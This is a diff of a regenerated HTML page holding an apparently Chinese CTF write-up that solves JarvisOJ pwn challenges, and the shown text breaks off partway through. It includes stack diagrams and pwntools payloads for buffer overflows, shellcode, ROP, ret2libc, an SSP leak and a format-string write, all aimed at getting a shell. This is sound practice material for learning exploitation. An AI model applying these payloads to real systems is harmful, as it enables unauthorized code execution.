@@ -31,7 +31,7 @@
 
 
 
-<meta name="generator" content="Hugo 0.55.2" />
+<meta name="generator" content="Hugo 0.75.1" />
 
 
 <link rel="canonical" href="https://bash-c.github.io/post/jarvisoj-pwn-writeup/" />
@@ -60,16 +60,13 @@
 <meta property="og:description" content="JarvisOJ-all-pwn-Writeup 解决了 jarvisOJ 至今 （2018.9.19）的所有 pwn 题目，分享一下 writeup。做题目的过程中参考了很多师傅的 writeup，在 Reference 中贴出了师傅们的" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://bash-c.github.io/post/jarvisoj-pwn-writeup/" />
-<meta property="article:published_time" content="2018-09-16T22:09:27&#43;08:00"/>
-<meta property="article:modified_time" content="2018-09-16T22:09:27&#43;08:00"/>
-
+<meta property="article:published_time" content="2018-09-16T22:09:27+08:00" />
+<meta property="article:modified_time" content="2018-09-16T22:09:27+08:00" />
 <meta itemprop="name" content="JarvisOJ Pwn Writeup">
 <meta itemprop="description" content="JarvisOJ-all-pwn-Writeup 解决了 jarvisOJ 至今 （2018.9.19）的所有 pwn 题目，分享一下 writeup。做题目的过程中参考了很多师傅的 writeup，在 Reference 中贴出了师傅们的">
-
-
-<meta itemprop="datePublished" content="2018-09-16T22:09:27&#43;08:00" />
-<meta itemprop="dateModified" content="2018-09-16T22:09:27&#43;08:00" />
-<meta itemprop="wordCount" content="10233">
+<meta itemprop="datePublished" content="2018-09-16T22:09:27+08:00" />
+<meta itemprop="dateModified" content="2018-09-16T22:09:27+08:00" />
+<meta itemprop="wordCount" content="10234">
 
 
 
@@ -316,7 +313,7 @@
             <a href="https://bash-c.github.io/categories/writeup/"> writeup </a>
             
           </div>
-        <span class="more-meta"> 10233 words </span>
+        <span class="more-meta"> 10234 words </span>
           <span class="more-meta"> 21 min read </span>
 
         
@@ -337,68 +334,59 @@
   <h2 class="post-toc-title">Table of Contents</h2>
   <div class="post-toc-content">
     <nav id="TableOfContents">
-<ul>
-<li><a href="#jarvisoj-all-pwn-writeup">JarvisOJ-all-pwn-Writeup</a>
-<ul>
-<li><a href="#xman-level0-50">[XMAN]level0 (50)</a></li>
-<li><a href="#tell-me-something-100">Tell Me Something (100)</a></li>
-<li><a href="#xman-level1-100">[XMAN]level1 (100)</a></li>
-<li><a href="#xman-level2-150">[XMAN]level2 (150)</a></li>
-<li><a href="#typo-150">Typo (150)</a></li>
-<li><a href="#xman-level2-x64-200">[XMAN]level2_x64 (200)</a></li>
-<li><a href="#xman-level3-200">[XMAN]level3 (200)</a></li>
-<li><a href="#smashes-200">Smashes (200)</a></li>
-<li><a href="#61dctf-fm-200">[61dctf]fm (200)</a></li>
-<li><a href="#backdoor-200">Backdoor (200)</a></li>
-<li><a href="#xman-level3-x64-250">[XMAN]level3(x64) (250)</a></li>
-<li><a href="#xman-level4-250">[XMAN]level4 (250)</a></li>
-<li><a href="#test-your-memory-300">Test Your Memory (300)</a></li>
-<li><a href="#xman-level5-300">[XMAN]level5 (300)</a>
-<ul>
-<li><a href="#mprotect">mprotect</a></li>
-<li><a href="#mmap">mmap</a></li>
-</ul></li>
-<li><a href="#add-300">Add (300)</a></li>
-<li><a href="#61dctf-calc-exe-300">[61dctf]calc.exe (300)</a></li>
-<li><a href="#guess-300">Guess (300)</a></li>
-<li><a href="#http-350">HTTP (350)</a></li>
-<li><a href="#guestbook2-400">Guestbook2 (400)</a></li>
-<li><a href="#xman-level6-350">[XMAN]level6 (350)</a></li>
-<li><a href="#xman-level6-x64-400">[XMAN]level6_x64 (400)</a></li>
-<li><a href="#61dctf-hsys-400">[61dctf]hsys (400)</a></li>
-<li><a href="#61dctf-hiphop-400">[61dctf]hiphop (400)</a></li>
-<li><a href="#item-board-450">Item Board (450)</a></li>
-<li><a href="#png2ascii-450">png2ascii (450)</a></li>
-<li><a href="#61dctf-inst-500">[61dctf]inst (500)</a></li>
-<li><a href="#61dctf-xworks-500">[61dctf]xworks (500)</a></li>
-</ul></li>
-<li><a href="#广告时间">广告时间</a>
-<ul>
-<li><a href="#广告一">广告一</a></li>
-<li><a href="#广告二">广告二</a></li>
-</ul></li>
-<li><a href="#reference-and-thanks-to">Reference and Thanks to</a></li>
-</ul>
+  <ul>
+    <li><a href="#xmanlevel0-50">[XMAN]level0 (50)</a></li>
+    <li><a href="#tell-me-something-100">Tell Me Something (100)</a></li>
+    <li><a href="#xmanlevel1-100">[XMAN]level1 (100)</a></li>
+    <li><a href="#xmanlevel2-150">[XMAN]level2 (150)</a></li>
+    <li><a href="#typo-150">Typo (150)</a></li>
+    <li><a href="#xmanlevel2_x64-200">[XMAN]level2_x64 (200)</a></li>
+    <li><a href="#xmanlevel3-200">[XMAN]level3 (200)</a></li>
+    <li><a href="#smashes-200">Smashes (200)</a></li>
+    <li><a href="#61dctffm-200">[61dctf]fm (200)</a></li>
+    <li><a href="#backdoor-200">Backdoor (200)</a></li>
+    <li><a href="#xmanlevel3x64-250">[XMAN]level3(x64) (250)</a></li>
+    <li><a href="#xmanlevel4-250">[XMAN]level4 (250)</a></li>
+    <li><a href="#test-your-memory-300">Test Your Memory (300)</a></li>
+    <li><a href="#xmanlevel5-300">[XMAN]level5 (300)</a>
+      <ul>
+        <li><a href="#mprotect">mprotect</a></li>
+        <li><a href="#mmap">mmap</a></li>
+      </ul>
+    </li>
+    <li><a href="#add-300">Add (300)</a></li>
+    <li><a href="#61dctfcalcexe-300">[61dctf]calc.exe (300)</a></li>
+    <li><a href="#guess-300">Guess (300)</a></li>
+    <li><a href="#http-350">HTTP (350)</a></li>
+    <li><a href="#guestbook2-400">Guestbook2 (400)</a></li>
+    <li><a href="#xmanlevel6-350">[XMAN]level6 (350)</a></li>
+    <li><a href="#xmanlevel6_x64-400">[XMAN]level6_x64 (400)</a></li>
+    <li><a href="#61dctfhsys-400">[61dctf]hsys (400)</a></li>
+    <li><a href="#61dctfhiphop-400">[61dctf]hiphop (400)</a></li>
+    <li><a href="#item-board-450">Item Board (450)</a></li>
+    <li><a href="#png2ascii-450">png2ascii (450)</a></li>
+    <li><a href="#61dctfinst-500">[61dctf]inst (500)</a></li>
+    <li><a href="#61dctfxworks-500">[61dctf]xworks (500)</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#广告一">广告一</a></li>
+    <li><a href="#广告二">广告二</a></li>
+  </ul>
 </nav>
   </div>
 </div>
 
     
     <div class="post-content">
-      
-
-<h1 id="jarvisoj-all-pwn-writeup">JarvisOJ-all-pwn-Writeup</h1>
-
+      <h1 id="jarvisoj-all-pwn-writeup">JarvisOJ-all-pwn-Writeup</h1>
 <p>解决了 <a href="https://www.jarvisoj.com/login">jarvisOJ</a> 至今 （2018.9.19）的所有 pwn 题目，分享一下 writeup。做题目的过程中参考了很多师傅的 writeup，在 Reference 中贴出了师傅们的博客，感谢师傅们的分享。</p>
-
 <p>题目较多，对于网上有较多 writeup 的题目，不再详细分析，只列出思路；着重分析 writeup 较少的题目。</p>
-
-<h2 id="xman-level0-50">[XMAN]level0 (50)</h2>
-
+<h2 id="xmanlevel0-50">[XMAN]level0 (50)</h2>
 <p>最简单的栈溢出，给了能直接拿 shell 的函数，覆盖返回地址为该函数地址即可</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -408,9 +396,9 @@
 </span><span class="lnt"> 8
 </span><span class="lnt"> 9
 </span><span class="lnt">10
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">+----------+
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">+----------+
 |........  |
 |padding   |
 |........  |
@@ -419,37 +407,34 @@
 |padding   |  &lt;- rbp
 +----------+
 |callsystem|  &lt;- ret addr
-+----------+</pre></td></tr></table>
++----------+
+</code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x80</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./level0&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;callsystem&#39;</span><span class="p">])</span></code></pre></td></tr></table>
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x80</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./level0&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;callsystem&#39;</span><span class="p">])</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_level0/solve.py">exploit here</a></p>
-
+</div><p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_level0/solve.py">exploit here</a></p>
 <h2 id="tell-me-something-100">Tell Me Something (100)</h2>
-
 <p>与上一题几乎完全一样，不再分析</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x80</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./guestbook&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;good_game&#39;</span><span class="p">])</span></code></pre></td></tr></table>
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x80</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./guestbook&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;good_game&#39;</span><span class="p">])</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_Tell_Me_Something/solve.py">exploit here</a></p>
-
-<h2 id="xman-level1-100">[XMAN]level1 (100)</h2>
-
+</div><p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_Tell_Me_Something/solve.py">exploit here</a></p>
+<h2 id="xmanlevel1-100">[XMAN]level1 (100)</h2>
 <p>有栈溢出漏洞，没有开 NX 保护，因此可以用 shellcode</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -461,9 +446,9 @@
 </span><span class="lnt">10
 </span><span class="lnt">11
 </span><span class="lnt">12
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">+----------+              
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">+----------+              
 |shellcode |  &lt;-----------+
 |shellcode |              |
 |........  |              |
@@ -474,24 +459,23 @@
 |junk data |  &lt;- ebp      |
 +----------+              |
 |buf addr  |  &lt;- ret add -+
-+----------+</pre></td></tr></table>
++----------+
+</code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x88</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span></code></pre></td></tr></table>
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x88</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_level1/solve.py">exploit here</a></p>
-
-<h2 id="xman-level2-150">[XMAN]level2 (150)</h2>
-
-<p>存在栈溢出，程序中有 <strong>system</strong> 函数 和 <strong>/bin/sh</strong> 字符串，根据函数调用约定，32 位程序函数的参数是放在栈上的，因此可以通过伪造一个调用 <strong>system(&ldquo;/bin/sh&rdquo;)</strong> 的栈结构来 get shell</p>
+</div><p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_level1/solve.py">exploit here</a></p>
+<h2 id="xmanlevel2-150">[XMAN]level2 (150)</h2>
+<p>存在栈溢出，程序中有 <strong>system</strong> 函数 和 <strong>/bin/sh</strong> 字符串，根据函数调用约定，32 位程序函数的参数是放在栈上的，因此可以通过伪造一个调用 <strong>system(&quot;/bin/sh&quot;)</strong> 的栈结构来 get shell</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -506,9 +490,9 @@
 </span><span class="lnt">13
 </span><span class="lnt">14
 </span><span class="lnt">15
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">+---------------+
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">+---------------+
 |padding        |
 |.......        |
 |               |
@@ -522,34 +506,29 @@
 |junk data      | &lt;- system ret
 +---------------+
 |/bin/sh addr   | 
-+---------------+</pre></td></tr></table>
++---------------+
+</code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span> <span class="o">+</span> <span class="mi">4</span><span class="p">),</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">],</span> <span class="s1">&#39;aaaa&#39;</span><span class="p">,</span> <span class="nb">next</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)))</span>
-<span class="c1"># 此时程序运行流程为 vulnerable_function -&gt; system(&#34;/bin/sh&#34;) -&gt; junk data，因为我们已经执行了 system(&#34;/bin/sh&#34;)，因此 system(&#34;/bin/sh&#34;) 的返回地址（即 junk data 可以随便指定）</span></code></pre></td></tr></table>
+<span class="c1"># 此时程序运行流程为 vulnerable_function -&gt; system(&#34;/bin/sh&#34;) -&gt; junk data，因为我们已经执行了 system(&#34;/bin/sh&#34;)，因此 system(&#34;/bin/sh&#34;) 的返回地址（即 junk data 可以随便指定）</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_level2/solve.py">exploit here</a></p>
-
+</div><p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_level2/solve.py">exploit here</a></p>
 <h2 id="typo-150">Typo (150)</h2>
-
 <p>这道题目特殊在程序是 arm 架构的，但其实只是一个简单的 rop，把环境搭建好后并不难。</p>
-
 <p>我在另一篇博文中以这道题目为例分析了 arm 的 pwn，包括了运行和调试的环境搭建，以及恢复符号，<a href="http://m4x.fun/post/how-2-pwn-an-arm-binary/">链接</a>。</p>
-
 <p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_typo/solve.py">exploit here</a></p>
-
-<h2 id="xman-level2-x64-200">[XMAN]level2_x64 (200)</h2>
-
+<h2 id="xmanlevel2_x64-200">[XMAN]level2_x64 (200)</h2>
 <p>与 level2 相比思路基本一致，不同的是这道题目是 64 位的，64 位与 32 位的传参规则不同，需要用到 rop 控制寄存器，网上有很多分析 rop 的文章，这里就不介绍了。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -564,9 +543,9 @@
 </span><span class="lnt">13
 </span><span class="lnt">14
 </span><span class="lnt">15
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">+--------------+
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">+--------------+
 |padding       |
 |......        |
 |              |
@@ -580,24 +559,23 @@
 |/bin/sh addr  |
 +--------------+
 |system addr   |
-+--------------+</pre></td></tr></table>
++--------------+
+</code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="p">),</span> <span class="n">prdi</span><span class="p">,</span> <span class="nb">next</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)),</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span></code></pre></td></tr></table>
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="p">),</span> <span class="n">prdi</span><span class="p">,</span> <span class="nb">next</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)),</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_level2_x64/solve.py">exploit here</a></p>
-
-<h2 id="xman-level3-200">[XMAN]level3 (200)</h2>
-
-<p>标准的 ret2libc，先通过 rop 控制 puts 出某个 GOT 中的地址以找到 libc 的基址（elf 的延迟绑定网上也有很多分析的文章，这里也不介绍了），有了 libc 的基地址后，libc 中的所有函数和字符串的地址就知道了，构造一个 <strong>system(&ldquo;/bin/sh&rdquo;)</strong> 的函数调用栈即可</p>
+</div><p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_level2_x64/solve.py">exploit here</a></p>
+<h2 id="xmanlevel3-200">[XMAN]level3 (200)</h2>
+<p>标准的 ret2libc，先通过 rop 控制 puts 出某个 GOT 中的地址以找到 libc 的基址（elf 的延迟绑定网上也有很多分析的文章，这里也不介绍了），有了 libc 的基地址后，libc 中的所有函数和字符串的地址就知道了，构造一个 <strong>system(&quot;/bin/sh&quot;)</strong> 的函数调用栈即可</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -629,9 +607,9 @@
 </span><span class="lnt">30
 </span><span class="lnt">31
 </span><span class="lnt">32
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">+-----------+
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">+-----------+
 |padding    |
 |......     |
 |           |
@@ -662,30 +640,27 @@
 |junk data  |  # system(&#34;/bin/sh&#34;) -&gt; junk data
 +-----------+
 |/bin/sh addr
-+-----------+</pre></td></tr></table>
++-----------+
+</code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-python" data-lang="python"><span class="n">leak</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span> <span class="o">+</span> <span class="mi">4</span><span class="p">),</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">],</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_start&#39;</span><span class="p">],</span> <span class="mi">1</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">],</span> <span class="mi">4</span><span class="p">)</span>
-<span class="n">rop</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span> <span class="o">+</span> <span class="mi">4</span><span class="p">),</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">],</span> <span class="s1">&#39;aaaa&#39;</span><span class="p">,</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)))</span></code></pre></td></tr></table>
+<span class="n">rop</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span> <span class="o">+</span> <span class="mi">4</span><span class="p">),</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">],</span> <span class="s1">&#39;aaaa&#39;</span><span class="p">,</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)))</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>新手容易犯的一个错误是本地和远程的 libc 混用，不同版本的 libc 函数的偏移一般不同，所以本地测试和远程需要使用对应的 libc，本地调试时可以通过 <code>LD_PRELOAD=./libc_path ./binary</code> 来指定 libc（版本相差过大时可能会出错）</p>
-
+</div><p>新手容易犯的一个错误是本地和远程的 libc 混用，不同版本的 libc 函数的偏移一般不同，所以本地测试和远程需要使用对应的 libc，本地调试时可以通过 <code>LD_PRELOAD=./libc_path ./binary</code> 来指定 libc（版本相差过大时可能会出错）</p>
 <p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_level3/solve.py">exploit here</a></p>
-
 <h2 id="smashes-200">Smashes (200)</h2>
-
-<p>ssp 攻击，大致原理是覆盖 __libc_argv[0]，触发栈溢出，通过报错来 leak 某些信息。<a href="https://veritas501.space/2017/04/28/论canary的几种玩法/">veritas501</a> 师傅对这种方法做过很优秀的分析。</p>
-
+<p>ssp 攻击，大致原理是覆盖 __libc_argv[0]，触发栈溢出，通过报错来 leak 某些信息。<a href="https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/">veritas501</a> 师傅对这种方法做过很优秀的分析。</p>
 <p>通过调试可以快速确定覆盖所需的偏移量以及重映射后 flag 的地址</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -766,54 +741,49 @@
 <span class="nf">smashes</span>         <span class="mi">0x400d21</span> <span class="no">push</span>   <span class="no">r12</span>
 <span class="nf">smashes</span>         <span class="mi">0x600d21</span> <span class="mi">0x657265487b465443</span> <span class="p">(</span><span class="err">&#39;</span><span class="no">CTF</span><span class="err">{</span><span class="no">Here</span><span class="err">&#39;</span><span class="p">)</span>
 <span class="nl">warning:</span> <span class="nf">Unable</span> <span class="no">to</span> <span class="no">access</span> <span class="mi">16000</span> <span class="no">bytes</span> <span class="no">of</span> <span class="no">target</span> <span class="no">memory</span> <span class="no">at</span> <span class="mi">0x7ffff7bd2e83</span><span class="p">,</span> <span class="no">halting</span> <span class="no">search.</span>
-<span class="nf">pwndbg</span><span class="err">&gt;</span> </code></pre></td></tr></table>
+<span class="nf">pwndbg</span><span class="err">&gt;</span> 
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>因此可以构造如下的 payload</p>
+</div><p>因此可以构造如下的 payload</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x218</span><span class="p">),</span> <span class="mh">0x400d21</span><span class="p">)</span></code></pre></td></tr></table>
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x218</span><span class="p">),</span> <span class="mh">0x400d21</span><span class="p">)</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>或者可以用一种更暴力的方法，不计算偏移量，直接用 flag 地址暴力覆盖过去</p>
+</div><p>或者可以用一种更暴力的方法，不计算偏移量，直接用 flag 地址暴力覆盖过去</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400d21</span><span class="p">)</span> <span class="o">*</span> <span class="mi">100</span></code></pre></td></tr></table>
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400d21</span><span class="p">)</span> <span class="o">*</span> <span class="mi">100</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_Smashes/solve.py">exploit here</a></p>
-
-<h2 id="61dctf-fm-200">[61dctf]fm (200)</h2>
-
+</div><p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_Smashes/solve.py">exploit here</a></p>
+<h2 id="61dctffm-200">[61dctf]fm (200)</h2>
 <p>格式化字符串漏洞的入门题目，格式化字符串漏洞的原理也可以找到很多分析，这里不说了。这道题目中只需要修改一个全局变量的值为 4 即可</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./fm&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="s2">&#34;%11$n&#34;</span>
